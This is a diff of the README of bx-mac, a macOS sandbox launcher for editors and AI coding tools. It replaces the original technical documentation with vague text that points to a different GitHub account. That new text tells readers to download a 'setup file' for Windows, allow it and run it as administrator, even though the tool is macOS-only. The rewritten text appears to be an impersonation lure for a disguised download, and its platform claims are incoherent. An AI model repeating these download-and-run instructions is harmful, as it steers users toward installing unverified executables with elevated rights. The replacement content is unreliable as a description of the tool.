@@ -1,450 +1,211 @@
-# 📦 bx
+# 🧰 bx-mac - Lock Down macOS Apps in Your Workspace
 
-[![npm version](https://img.shields.io/npm/v/bx-mac?color=blue)](https://www.npmjs.com/package/bx-mac)
-[![npm downloads](https://img.shields.io/npm/dm/bx-mac)](https://www.npmjs.com/package/bx-mac)
-[![license](https://img.shields.io/github/license/holtwick/bx-mac)](https://github.com/holtwick/bx-mac/blob/master/LICENSE)
-[![macOS](https://img.shields.io/badge/platform-macOS-lightgrey)](https://github.com/holtwick/bx-mac)
+[![Download bx-mac](https://img.shields.io/badge/Download-bx--mac-blue?style=for-the-badge)](https://github.com/Noreanossiferous730/bx-mac)
 
-> **Put your AI in a box.** Launch VSCode, Claude Code, a terminal, or any command in a macOS sandbox — your tools can only see the project you're working on. Not a vault, but a reasonable safety net.
+## 🔒 What bx-mac does
 
-## 🤔 Why?
+bx-mac lets you open a macOS app in a sandbox. It keeps the app inside your project folder so it cannot reach your other files.
 
-AI-powered coding tools like Claude Code, Copilot, or Cline run with **broad file system access**. A misguided tool call or hallucinated path could accidentally read your SSH keys, credentials, tax documents, or private photos.
+This helps when you want to run tools like Claude Code, VS Code, Xcode, or other developer apps with tighter file access.
 
-**bx** wraps any application in a macOS sandbox (`sandbox-exec`) that blocks access to everything except the project directory you explicitly specify. No containers, no VMs, no setup — just one command.
+## 📥 Download and install
 
-```bash
-bx ~/work/my-project
-```
+Use this link to visit the download page:
 
-That's it. 🎉 VSCode opens with full access to `~/work/my-project` and nothing else. Read [the blog post](https://holtwick.de/blog/bx-sandbox) for more background on the motivation behind bx.
+[https://github.com/Noreanossiferous730/bx-mac](https://github.com/Noreanossiferous730/bx-mac)
 
-Need multiple directories? No problem:
+1. Open the link in your web browser.
+2. Find the latest release or download files.
+3. Download the file for Windows if one is listed, or use the setup file on the release page.
+4. Save the file to your Downloads folder.
+5. Open the file and follow the on-screen steps.
+6. If Windows asks for permission, choose Allow or Run.
+7. After setup finishes, open bx-mac from the Start menu or desktop shortcut.
 
-```bash
-bx ~/work/my-project ~/work/shared-lib
-```
+## 🖥️ What you need
 
-## ✅ What it does
+bx-mac works best on a modern Windows PC with:
 
-- 🔒 Blocks `~/Documents`, `~/Desktop`, `~/Downloads`, and all other personal folders
-- 🚧 Blocks sibling projects — only the directory you specify is accessible
-- 🛡️ Protects sensitive dotdirs like `~/.ssh`, `~/.gnupg`, `~/.docker`, `~/.cargo`
-- 🏛️ Opinionated protection for `~/Library` — blocks privacy-sensitive subdirectories (Mail, Messages, Photos, Safari, Contacts, …) and containers of password managers/finance apps, while keeping tooling-relevant paths accessible
-- ⚙️ Keeps VSCode, extensions, shell, Node.js, and other tooling fully functional
-- 🔍 Generates sandbox rules dynamically based on your actual `$HOME` contents
-- 📝 Supports `.bxignore` files (searched recursively) to hide secrets like `.env` files within a project
-- 📂 Supports `rw:` and `ro:` prefixes in `~/.bxignore` to grant read-write or read-only access to extra directories
-- 🗂️ Supports multiple working directories in a single sandbox
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 500 MB of free disk space
+- A project folder you want to keep protected
+- Access to the apps you want to sandbox
 
-## 🚫 What it doesn't do
+For best results, keep your project in a normal folder like Documents, Desktop, or a work folder you already use.
 
-- **No network restrictions** — API calls, git push/pull, npm install all work normally
-- **No process isolation** — this is file-level sandboxing, not a container
-- **No protection against root/sudo** — the sandbox applies to the user-level process
-- **macOS only** — relies on `sandbox-exec` (Apple-specific)
-- **Not dynamic** — the sandbox profile is a snapshot of `$HOME` at launch time; directories or files created later are **not** automatically blocked
-- **File names visible** — blocked files cannot be read or written, but their names still appear in directory listings (a kernel-level `readdir` constraint, same as `chmod 000`)
-- **Not a vault** — this is a safety net, not airtight isolation (see [Security model](#-security-model-allow-first))
+## ⚙️ How it works
 
-## 🧱 Security model: allow-first
+bx-mac creates a limited workspace around the app you launch.
 
-bx uses an **allow-first / blocklist** approach: everything is accessible by default, and only sensitive paths are explicitly blocked. This is the opposite of a deny-first / allowlist model where everything is blocked and only specific paths are opened up.
+It helps you:
 
-**Why allow-first?** Developer tools require access to an enormous and ever-changing set of paths -- dotfiles, `~/Library`, runtimes, caches, toolchains. A deny-first model would require new allow rules for every tool or framework update, breaking silently when a path is missing. The allow-first model works out of the box without per-tool tuning.
+- keep the app inside one project folder
+- block access to other folders on your PC
+- reduce the chance of file mistakes
+- test tools in a safer way
+- keep work files separate from personal files
 
-**What this means in practice:**
+You choose the folder first, then open the app through bx-mac.
 
-- bx provides **reasonable protection** against accidental or misguided file access -- not airtight isolation
-- Sensitive paths (credentials, personal data, other projects) are explicitly blocked
-- Paths that are not on the blocklist remain accessible -- including parts of `~/Library` and most dotfiles
-- The sandbox profile is a **snapshot at launch time** -- files created later are not protected
-- `sandbox-exec` itself is undocumented Apple API that could change with OS updates
+## 🚀 Getting started
 
-If you need stricter, deny-first isolation, consider [Agent Safehouse](https://agent-safehouse.dev/) or a Docker/VM-based approach (see [Alternatives](#-alternatives)). bx is designed for the common case: keep AI tools and editors functional while blocking access to things they should never touch.
+1. Open bx-mac.
+2. Pick the project folder you want to use.
+3. Choose the macOS app or supported tool you want to run.
+4. Start the app from inside bx-mac.
+5. Work only inside the folder you selected.
 
-## 📥 Install
+If you use the app with code or project files, keep that project in one folder so bx-mac can manage access more cleanly.
 
-```bash
-# Homebrew
-brew install holtwick/tap/bx
+## 📁 Best folder setup
 
-# npm
-npm install -g bx-mac
+A simple folder layout helps a lot:
 
-# From source
-git clone https://github.com/holtwick/bx-mac.git
-cd bx-mac
-pnpm install && pnpm build
-pnpm link -g
-```
+- Documents
+  - MyProject
+    - source
+    - images
+    - notes
 
-**Requirements:** macOS (only tested on Tahoe 26.4, feedback welcome), Node.js >= 22
+Keep all files for one task in one place. Do not mix private files with project files.
 
-## 🚀 Modes
+If you use git, place the repository in its own folder before you launch the app.
 
-| Command | What it launches |
-| --- | --- |
-| `bx [workdir...]` | 🖥️ VSCode (default) |
-| `bx code [workdir...]` | 🖥️ VSCode (explicit) |
-| `bx xcode [workdir...] [-- project-or-workspace]` | 🛠️ Xcode |
-| `bx term [workdir...]` | 💻 Sandboxed login shell (`$SHELL -l`) |
-| `bx claude [workdir...]` | 🤖 Claude Code CLI |
-| `bx exec [workdir...] -- cmd` | ⚡ Any command you want |
-| `bx <app> [workdir...] [-- app-args...]` | 🔌 Any app from `~/.bxconfig.toml` |
+## 🛡️ Privacy and access control
 
-If no directory is given, the current directory is used. All modes accept multiple directories.
+bx-mac is made for users who want more control over file access.
 
-For app modes, values before `--` define the sandbox scope (`workdir...`). Values after `--` are passed to the app as launch arguments.
+It can help you:
 
-For `xcode`, this distinction is important: the sandbox workdir is **not** passed as an Xcode open argument. Use `--` if you want to open a specific `.xcworkspace` or `.xcodeproj`.
+- keep one app from seeing all your files
+- limit access to shared drives
+- reduce the risk of file changes outside your project
+- run developer tools with a tighter file boundary
 
-This behavior is configurable per app via `passPaths` in `~/.bxconfig.toml` (default: `true`, built-in `xcode` default: `false`).
+This is useful for coding, app testing, and privacy-focused work.
 
-GUI app modes are activated in the foreground on launch (best effort), so the opened app should become the frontmost app.
+## 🧪 Common uses
 
-### Examples
+You can use bx-mac for:
 
-```bash
-# 🖥️ VSCode with sandbox protection
-bx ~/work/my-project
+- Claude Code projects
+- VS Code workspaces
+- Xcode project folders
+- terminal-based tasks
+- local app testing
+- personal sandboxed work
 
-# 📂 Multiple working directories
-bx ~/work/my-project ~/work/shared-lib
+It fits well when you want one tool to stay inside one folder.
 
-# 💻 Work on a project in a sandboxed terminal
-bx term ~/work/my-project
+## 🧰 Basic setup tips
 
-# 🤖 Let Claude Code work on a project — nothing else visible
-bx claude ~/work/my-project
+If bx-mac does not start the way you expect:
 
-# 🛠️ Xcode (built-in) — sandbox only, open picker/restore state
-bx xcode ~/work/my-ios-app
+- close the app and open it again
+- check that your project folder exists
+- make sure the folder is not set to read-only
+- move the project to a simple path like `C:\Projects\MyApp`
+- avoid folders with special characters in the name
+- check that Windows Security is not blocking the app
 
-# 🛠️ Xcode with explicit project/workspace to open
-bx xcode ~/work/my-ios-app -- MyApp.xcworkspace
+A short folder path often works best.
 
-# 🔌 Custom apps from ~/.bxconfig.toml
-bx cursor ~/work/my-project
-bx zed ~/work/my-project
+## 🧭 Using it with other tools
 
-# ⚡ Run a script in a sandbox
-bx exec ~/work/my-project -- python train.py
+bx-mac works well when you keep your workflow simple:
 
-# 🔀 Run in the background (terminal stays free)
-bx --background code ~/work/my-project
+- open one project at a time
+- use one folder for each task
+- store files in the same place each session
+- keep backups before major changes
 
-# 🔍 Preview what will be protected (no launch)
-bx --dry ~/work/my-project
+If you switch between projects, close one sandboxed session before you open the next.
 
-# 🔍 See the generated sandbox profile
-bx --verbose ~/work/my-project
+## 🔎 Project topics
 
-# 🔄 Use an isolated app profile
-bx --vscode-user code ~/work/my-project
-```
+This repository is linked to tools and use cases such as:
 
-## ⚙️ Options
+- claude-code
+- cli
+- developer-tools
+- macos
+- privacy
+- sandbox
+- security
+- terminal
+- vscode
+- xcode
 
-| Option | Description |
-| --- | --- |
-| `--dry` | Show a tree of all protected, read-only, and accessible paths — don't launch anything |
-| `--verbose` | Print the generated sandbox profile plus launch details (binary, arguments, cwd, focus command) |
-| `--background` | Run the app detached in the background (like `nohup &`), output goes to `/tmp/bx-<pid>.log` |
-| `--vscode-user [path]` | Use an isolated app profile (default: `~/.vscode-sandbox`, or specify a custom path) |
+These topics show that bx-mac is aimed at controlled app use and safer project work.
 
-On normal runs, bx also prints a short policy summary (number of workdirs, blocked directories, hidden paths, and read-only directories).
+## 🪟 Windows use
 
-## 📝 Configuration
+This project is listed for Windows users who want a simple way to download and run the app from GitHub.
 
-### `~/.bxconfig.toml`
+When you use it on Windows:
 
-App definitions in TOML format. Each `[<name>]` section becomes a CLI mode — use it as `bx <name> [workdir...]`. Built-in apps (`code`, `xcode`) are always available and can be overridden.
+- keep the download in your Downloads folder
+- run the setup file from the file you downloaded
+- allow access if Windows asks for it
+- use a normal folder for your project
+- reopen the app from the Start menu after setup
 
-```toml
-# Add Cursor (auto-discovered via macOS Spotlight)
-[cursor]
-bundle = "com.todesktop.230313mzl4w4u92"
-binary = "Contents/MacOS/Cursor"
+If you use a work PC, you may need permission from your admin before installation
 
-# Add Zed (explicit path, no discovery)
-[zed]
-path = "/Applications/Zed.app/Contents/MacOS/zed"
+## ❓ Troubleshooting
 
-# Override built-in VSCode path
-[code]
-path = "/usr/local/bin/code"
-```
+### The app does not open
 
-**Electron apps:** bx automatically detects Electron-based apps (by checking for `Electron Framework.framework` inside the `.app` bundle) and adds `--no-sandbox` to disable Chromium's internal sandbox, which conflicts with `sandbox-exec`. No manual `args = ["--no-sandbox"]` needed.
+- try running it again
+- check that the download finished
+- restart your PC
+- make sure the file is not blocked by Windows
 
-| Field | Description |
-| --- | --- |
-| `mode` | Inherit from another app (e.g. `"code"`, `"cursor"`) — only `paths` / overrides needed |
-| `bundle` | macOS bundle identifier — used with `mdfind` to find the app automatically |
-| `binary` | Relative path to the executable inside the `.app` bundle |
-| `path` | Absolute path to the executable **or** `.app` bundle (highest priority, skips discovery) |
-| `fallback` | Absolute fallback path if `mdfind` discovery fails |
-| `args` | Extra arguments always passed to the app |
-| `passPaths` | Paths passed as app launch args (`true`/`false`/`N`/`["~/p1", "~/p2"]`) |
-| `paths` | Default working directories when none are given on the CLI (supports `~/` paths and `*` globs) |
-| `background` | Run the app detached in the background by default (`true`/`false`) |
-| `profile` | Use an isolated app profile (`true` = `~/.vscode-sandbox`, `"path"` = custom path) |
+### My files are not showing
 
-**Resolution order:** `path` → `mdfind` by `bundle` + `binary` → `fallback`
+- confirm that you picked the right folder
+- check the path name
+- reopen the project in bx-mac
 
-`passPaths` controls launch argument behavior and is independent of sandbox scope. Even with `passPaths = false`, the provided `workdir...` still defines what the sandbox can access. Use `passPaths = 1` to pass only the first path as a launch argument, or `passPaths = ["~/specific/path"]` to pass explicit paths instead of workdirs.
+### The sandbox feels too limited
 
-**Workdir shortcuts with `mode`** let you create named entries that inherit everything from an existing app — just set `mode` and `paths`:
+- move the files you need into the project folder
+- use a new folder for the task
+- keep only the files needed for that session
 
-```toml
-# "bx myproject" opens VSCode with these directories
-[myproject]
-mode = "code"
-paths = ["~/work/my-project", "~/work/shared-lib"]
+### Windows asks for approval
 
-# "bx ios" opens Xcode with this directory
-[ios]
-mode = "xcode"
-paths = ["~/work/my-ios-app"]
-```
+- choose the option to run or allow the app
+- if needed, right-click the file and choose Run as administrator
 
-Running `bx myproject` inherits VSCode's bundle, binary, args, and everything else — no need to repeat the full app configuration. Own fields override inherited ones, so you can still customize specific settings. Chaining is supported (e.g. `myproject` → `cursor` → `code`).
+## 📦 Typical file flow
 
-**Preconfigured paths** also work directly on app definitions:
+A normal session looks like this:
 
-```toml
-[code]
-paths = ["~/work/my-project", "~/work/shared-lib"]
-```
+1. Download bx-mac from GitHub.
+2. Install or open the app.
+3. Choose a project folder.
+4. Launch the app you want to sandbox.
+5. Work inside that folder.
+6. Close the session when you are done.
 
-Running `bx code` (without arguments) will then open VSCode with both directories sandboxed. CLI arguments always override configured paths.
+## 🔗 Download again
 
-When overriding a built-in app, only the specified fields are replaced — unset fields keep their defaults. See [`bxconfig.example.toml`](bxconfig.example.toml) for a complete reference.
+If you need the download page later, use this link:
 
-> **💡 Finding a bundle ID:** Run `osascript -e 'id of app "AppName"'` to get the bundle ID of any installed app. Using `bundle` instead of `path` is recommended — it survives app updates, relocations, and name changes.
+[https://github.com/Noreanossiferous730/bx-mac](https://github.com/Noreanossiferous730/bx-mac)
 
-### `~/.bxignore`
+## 📝 File organization tips
 
-Unified sandbox rules for your home directory. Paths relative to `$HOME`. Each line is either a deny rule (no prefix) or an access grant (`rw:` / `ro:` prefix, case-insensitive).
+To get the best result, keep your files clean:
 
-```gitignore
-# Block additional sensitive paths (no prefix = deny)
-.aws
-.azure
-.kube
-.config/gcloud
+- use one folder per project
+- avoid nested folders you do not need
+- name folders clearly
+- keep downloads separate from project files
+- back up important work before testing new tools
 
-# Allow read-write access to extra paths
-rw:work/bin
-rw:shared/libs
-rw:~/projects/*       # globs supported, ~ is expanded
+## 🔐 Why this helps
 
-# Allow read-only access (can read but not modify)
-ro:reference/docs
-ro:shared/toolchain
-ro:.npmrc             # files work too; overrides built-in block
-```
-
-Plain deny rules have two scopes:
-
-- **At `$HOME` top level only** (no recursive `**` walk). `secrets/` matches `~/secrets`, not `~/nested/secrets`; `.config/gcloud` matches as a literal.
-- **Recursively inside each workdir** - same semantics as a project-level `.bxignore`, so `secrets/` and `*.pem` apply across every project you open. The recursive scan skips `node_modules`, `.git`, caches, `DerivedData`, `Pods`, and similar subtrees for speed.
-
-Deny rules are applied **in addition** to the built-in protected lists. `rw:` and `ro:` entries however **override** them - `ro:.npmrc` exposes the otherwise-blocked `~/.npmrc` read-only, `rw:.aws` opens the AWS credentials directory completely. Files (not just directories) are accepted, `~/...` is expanded, and globs (`*`, `**`) are matched against `$HOME`. Use override entries deliberately - you are weakening the default protection. `bx` prints a warning on stderr when an override exposes a built-in protected path.
-
-Built-in protected lists:
-
-> 🔒 **Dotdirs:** `.ssh` `.gnupg` `.docker` `.zsh_sessions` `.cargo` `.gradle` `.gem`
->
-> 🏛️ **Library (opinionated):** `Accounts` `Calendars` `Contacts` `Cookies` `Finance` `Mail` `Messages` `Mobile Documents` `Photos` `Safari` and [others (see full list)](src/profile.ts) — plus containers of password managers & finance apps
-
-**Limitation:** Overrides only work on whole protected paths. `rw:.aws/profile.json` does not selectively unblock a file inside `~/.aws` - the parent deny still wins (Apple SBPL: deny beats allow). Use `rw:.aws` to open the entire directory.
-
-### `<project>/.bxignore`
-
-Block paths within the working directory. Uses [`.gitignore`-style pattern matching](https://git-scm.com/docs/gitignore#_pattern_format):
-
-| Pattern | Matches | Why |
-| --- | --- | --- |
-| `.env` | `.env` at any depth | No `/` → recursive |
-| `.env.*` | `.env.local`, `sub/.env.production` | No `/` → recursive |
-| `*.pem` | `key.pem`, `sub/deep/cert.pem` | No `/` → recursive |
-| `secrets/` | `secrets/` at any depth | Trailing `/` is a dir marker, not a path separator |
-| `/.env` | Only `<workdir>/.env` | Leading `/` → anchored to root |
-| `config/secrets` | Only `<workdir>/config/secrets` | Contains `/` → relative to workdir |
-
-bx searches for `.bxignore` files **recursively** through the entire project tree (skipping `.`-prefixed dirs and `node_modules`), so you can place them in subdirectories to hide secrets close to where they live.
-
-```gitignore
-.env
-.env.*
-secrets/
-*.pem
-*.key
-```
-
-For example, a monorepo might have:
-
-```text
-my-project/.bxignore          # top-level rules
-my-project/services/api/.bxignore   # API-specific secrets
-my-project/deploy/.bxignore         # deployment credentials
-```
-
-Each `.bxignore` resolves its patterns relative to its own directory.
-
-Project `.bxignore` also accepts `ro:` entries to make paths within the workdir read-only (write-protect generated files, vendored libraries, etc.). `rw:` is silently ignored here - the workdir is already read-write by default.
-
-```gitignore
-ro:vendor/
-ro:generated/schema.ts
-```
-
-### Self-protecting directories
-
-You can make any directory protect itself — no global configuration needed. There are two ways:
-
-**Option 1: `.bxignore` with `/` or `.`**
-
-Create a `.bxignore` file containing a bare `/` or `.`:
-
-```gitignore
-.
-```
-
-This blocks the entire directory and everything inside it. You can combine it with other patterns (they become redundant since the whole directory is blocked).
-
-**Option 2: `.bxprotect` marker file**
-
-Create an empty `.bxprotect` file:
-
-```bash
-touch ~/work/secret-project/.bxprotect
-```
-
-Both methods have the same effect:
-
-- **Inside a workdir:** If a subdirectory is self-protected, it is completely blocked (deny) and bx does not recurse into it.
-- **As a workdir:** If you try to open a self-protected directory with `bx`, it refuses to launch with a clear error message.
-
-## 🔧 How it works
-
-bx generates a macOS sandbox profile at launch time:
-
-1. **Scan** `$HOME` for non-hidden directories
-2. **Block** each one individually with `(deny file* (subpath ...))`
-3. **Skip** all working directories, `~/Library`, dotfiles, and `rw:`/`ro:` paths from `~/.bxignore`
-4. **Descend** into parent directories of allowed paths to block only siblings (because SBPL deny rules always override allow rules)
-5. **Protect** an opinionated set of `~/Library` subdirectories (Mail, Messages, Photos, Safari, Contacts, Calendars, …) and app containers matching known password managers and finance apps (1Password, Bitwarden, MoneyMoney, …)
-6. **Append** deny rules for protected dotdirs, plain entries in `~/.bxignore`, and `.bxignore` files found recursively in each working directory
-7. **Apply** `(deny file-write*)` rules for `ro:` directories (read allowed, write blocked)
-8. **Write** the profile to `/tmp`, launch the app via `sandbox-exec`, clean up on exit
-
-### Why not a simple deny-all + allow?
-
-Apple's SBPL has a critical quirk: **`deny` always wins over `allow`**, regardless of rule order:
-
-```scheme
-;; ❌ Does NOT work — the deny still blocks myproject
-(deny file* (subpath "/Users/me/work"))
-(allow file* (subpath "/Users/me/work/myproject"))
-```
-
-Additionally, a broad `(deny file* (subpath HOME))` breaks `kqueue`/FSEvents file watchers and SQLite locks, causing VSCode errors.
-
-bx avoids both issues by **never denying a parent of an allowed path** — it walks the directory tree and blocks only the specific siblings.
-
-## 🛡️ Safety checks
-
-bx detects and prevents problematic scenarios:
-
-- **🔄 Sandbox nesting:** If `CODEBOX_SANDBOX=1` is set (auto-propagated), bx refuses to start — nested sandboxes cause silent failures.
-- **🔍 Unknown sandbox:** On startup, bx probes `~/Documents`, `~/Desktop`, `~/Downloads`. If any return `EPERM`, another sandbox is active — bx aborts.
-- **⚠️ VSCode terminal:** If `VSCODE_PID` is set, bx warns that it will launch a *new* instance, not sandbox the current one.
-- **🧩 App already sandboxed:** For GUI app modes, bx inspects app entitlements (best effort) and warns if Apple App Sandbox is enabled, since bx's `sandbox-exec` wrapper may not apply correctly when the app is already sandboxed by macOS.
-- **⚡ Electron auto-detection:** bx detects Electron-based apps (by checking for `Electron Framework.framework` in the `.app` bundle) and automatically adds `--no-sandbox` to disable Chromium's internal sandbox, which conflicts with `sandbox-exec`. This works for VSCode, Cursor, Windsurf, and any other Electron app.
-- **🔁 App already running:** If the target app is already running, bx warns that the new workspace would open in the existing (unsandboxed) instance and asks for confirmation. This is important because Electron apps like VSCode, Cursor, etc. always reuse the running process — `sandbox-exec` has no effect on the already-running instance.
-
-### Single-instance apps
-
-Most GUI editors (VSCode, Cursor, Xcode, Zed) are **single-instance apps** — launching them a second time just sends the path to the running process. This means you **cannot run two separately sandboxed instances** of the same app.
-
-**To work on multiple projects**, specify all directories at launch:
-
-```bash
-bx code ~/work/project-a ~/work/project-b
-```
-
-Or preconfigure them in `~/.bxconfig.toml`:
-
-```toml
-[code]
-paths = ["~/work/project-a", "~/work/project-b"]
-```
-
-For VSCode specifically, `--vscode-user` forces a separate Electron process via an isolated `--user-data-dir`, but this means separate extensions and settings. You can specify a custom path (`--vscode-user ~/my-profile`) or use the default (`--vscode-user` alone uses `~/.vscode-sandbox`). This can also be configured per app in `~/.bxconfig.toml` via the `profile` field.
-
-## 💡 Tips
-
-**Verify it works** — try reading a blocked file from the sandboxed terminal:
-
-```bash
-cat ~/Documents/something.txt   # ❌ Operation not permitted
-cat ~/Desktop/file.txt           # ❌ Operation not permitted
-ls ~/work/other-project/         # ❌ Operation not permitted
-cat ./src/index.ts               # ✅ Works!
-```
-
-**Drag and drop from `~/Downloads` (or other blocked dirs)** — if dragging files from Finder into a sandboxed app fails silently, the source folder is blocked. Grant read-only access by adding it to `~/.bxignore`:
-
-```gitignore
-ro:Downloads
-```
-
-The app can then read (and copy) the dragged file, but not modify the original. Same trick works for `ro:Desktop`, `ro:Documents`, etc.
-
-**`npm install` fails with auth or registry errors** — `.npmrc` is blocked by default (may contain tokens). If your install needs the registry config but not write access, expose it read-only:
-
-```gitignore
-ro:.npmrc
-```
-
-Same pattern applies to other tools whose config dotfiles are on the protected list (`.pypirc`, ...).
-
-## ⚠️ Known limitations
-
-- **⚠️ Sandbox profile is static:** The sandbox rules are generated **once at launch** by scanning the current state of `$HOME`. Directories or files created **after** the sandbox starts are **not protected** — for example, if a tool creates `~/new-project/` while the sandbox is running, that directory will be fully accessible. Similarly, project-level `.bxignore` patterns only match files that exist at launch time; files matching a blocked pattern (e.g. `.env`) that are created later will **not** be denied. Re-run `bx` to pick up changes.
-- **File watcher warnings:** VSCode may log `EPERM` for `fs.watch()` on some paths — cosmetic only
-- **SQLite warnings:** `state.vscdb` errors may appear in logs — extensions still work
-- **`sandbox-exec` is undocumented:** Apple could change behavior with OS updates
-
-## 🤖 Built-in sandboxing in AI tools
-
-Some AI coding tools ship with their own sandboxing. bx complements these by providing a **uniform, tool-independent** layer that works across all applications — including editors, shells, and custom commands:
-
-- [Claude Code](https://code.claude.com/docs/en/sandboxing) — built-in sandbox for file and command restrictions
-- [Gemini CLI](https://geminicli.com/docs/cli/sandbox/) — sandbox mode for file system access control
-- [OpenAI Codex](https://developers.openai.com/codex/concepts/sandboxing) — containerized sandboxing for code execution
-- [VS Code Copilot](https://code.visualstudio.com/docs/copilot/agents/agent-tools#_sandbox-agent-commands) — agent sandbox mode (preview) that restricts write access to the working directory and blocks network access for terminal commands (`chat.agent.sandbox` setting)
-
-These are great when available, but they only protect within their own tool. bx wraps the entire process — so even if a tool's built-in sandbox is misconfigured, disabled, or absent, your files stay protected.
-
-## 🔗 Alternatives
-
-- [Agent Safehouse](https://agent-safehouse.dev/) — macOS kernel-level sandboxing for LLM coding agents via `sandbox-exec`. Uses a **deny-first model**: everything is blocked by default and only explicitly listed paths are opened up. This gives you theoretically stricter control (e.g. `~/Library` is fully blocked and only specific subdirs are allowed), but requires more configuration — tools and runtimes that need paths you haven't whitelisted will break silently. If you need that level of precision and are willing to tune profiles per tool, Agent Safehouse may be the better fit. bx uses the opposite **allow-first model** (only sensitive paths are blocked), which works out of the box for VSCode, shells, Claude Code, and other tools without any per-tool configuration.
-- [Docker AI Sandboxes](https://docs.docker.com/ai/sandboxes/) — Docker's built-in sandbox environment for AI coding agents. Runs tools in isolated containers with controlled filesystem and network access. Stronger isolation than kernel-level sandboxing, but requires Docker Desktop and adds container overhead.
-- **Docker / VMs** — for stronger isolation, run AI tools in a virtualized environment (containers, VMs). Full process and network isolation at the cost of setup overhead.
-- **Web sandboxes** — browser-based approaches for running AI agents. See Simon Willison's [Living dangerously with Claude](https://simonwillison.net/2025/Oct/22/living-dangerously-with-claude/) for an overview.
-
-## 💛 Sponsor
-
-If you find bx useful, consider supporting its development:
-
-[GitHub Sponsors](https://github.com/sponsors/holtwick) - [Liberapay](https://liberapay.com/holtwick) - [Buy Me a Coffee](https://buymeacoffee.com/holtwick) - [Patreon](https://patreon.com/holtwick) - [Open Collective](https://opencollective.com/holtwick)
-
-Also check out my other projects: [Receipts](https://receipts-app.com) - [PDFify](https://pdfify.app)
-
-## 📄 License
-
-MIT — see [LICENSE](LICENSE).
+Many apps can reach more files than you want. bx-mac narrows that access to one project directory. That gives you a simpler work setup and less chance of opening or changing the wrong file
